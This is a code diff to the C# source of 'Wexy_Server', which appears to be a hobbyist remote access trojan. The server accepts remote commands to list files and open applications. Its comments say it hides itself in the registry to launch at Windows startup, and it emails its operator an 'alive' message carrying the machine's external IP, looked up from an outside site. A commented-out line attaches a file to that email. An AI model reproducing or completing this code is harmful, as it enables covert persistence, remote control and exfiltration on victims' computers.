@@ -6,6 +6,11 @@ using System;
 using System.Drawing.Imaging;
 using System.Net.Mail;
 using System.Collections.Generic;
+using System.Net;
+using System.IO;
+using System.Data;
+using System.Security.Cryptography;
+
 
 namespace Wexy_Server
 {
@@ -22,14 +27,14 @@ namespace Wexy_Server
         {
 
         }
-        
-        //TODO - > returns the computer's IP adress.
-        public static string getIp()
-        {
-            string ip = "";
-            return ip;
-        }
 
+        //TODO - > Disconnect the client
+        public static void DisconnectClient()
+        {
+                
+        }
+        
+       
         
         public static void ReceiveCommands()
         {
@@ -82,21 +87,6 @@ namespace Wexy_Server
                             break;
 
                         case "showfiles":
-                            //Show files in specified folder
-                            //string path = CommandArray[1];
-                            
-                            /*switch (dir)
-                            {
-                                case "C" :
-                                    string c = @"C:/";
-                                     ListFiles(c);
-                                    break;
-                                case "desktop" :
-                                    string d = @"C:/users/" + Environment.UserName + "/Desktop/";
-                                    ListFiles(d);
-                                    break;
-                            }*/
-
                             string dir = CommandArray[1];
                             if (dir == "C")
                             {
@@ -117,6 +107,9 @@ namespace Wexy_Server
                             string appName = CommandArray[1];
                             openApp(appName);
                             break;
+
+                        case "disconnect":
+                            break;
                     }
                 }
                 catch
@@ -128,6 +121,33 @@ namespace Wexy_Server
 
 
         #region Commands
+
+       
+        //- ALMOST OK - [NOT TESTED YET]> returns the computer's IP adress.
+        public static string getIp()
+        {
+            string uneReponse = "";
+            //Create a request for the URL
+            try
+            {
+                WebRequest request = WebRequest.Create("http://myexternalip.com/raw");
+                //Get the response
+                WebResponse response = request.GetResponse();
+                //Get the stream containning the data sent by the server
+                Stream dataStream = response.GetResponseStream();
+                //Open the stream with streamreader for easy access.
+                StreamReader reader = new StreamReader(dataStream);
+                //Read the content.
+                string responseFromServer = reader.ReadToEnd();
+                reader.Close();
+                response.Close();
+                uneReponse = responseFromServer;
+            }
+            catch
+            { }
+            return uneReponse;
+        }
+
 
         //- ALMOST OK - [NOT TESTED YET] the server hides itself inside the registry and is launched on Windows startup.
         public static void AddToStartup()
@@ -155,11 +175,11 @@ namespace Wexy_Server
                 client.Credentials = new System.Net.NetworkCredential("your_mail_sender", "your_password");
 
                 //Configure the mail to send
-                Attachment objAttachment = new Attachment(@"path_to_file_you_wanna");
+                //Attachment objAttachment = new Attachment(@"path_to_file_you_wanna");
                 MailMessage msg = new MailMessage();
                 msg.To.Add("your_mail_receiver");
                 msg.From = new MailAddress("your_mail_sender");
-                msg.Attachments.Add(objAttachment);
+                //msg.Attachments.Add(objAttachment);
                 msg.Subject = "Wexy server has started ! ";
                 msg.Body = "Wexy server is alive at -> " + getIp();
 
@@ -297,7 +317,7 @@ namespace Wexy_Server
             //Get Connection's stream
             Receiver = connection.GetStream();
 
-            //I'm not sure thought..
+            //Allows us to write send data to the client
             Writer = connection.GetStream();
 
             //Start the receive commands thread
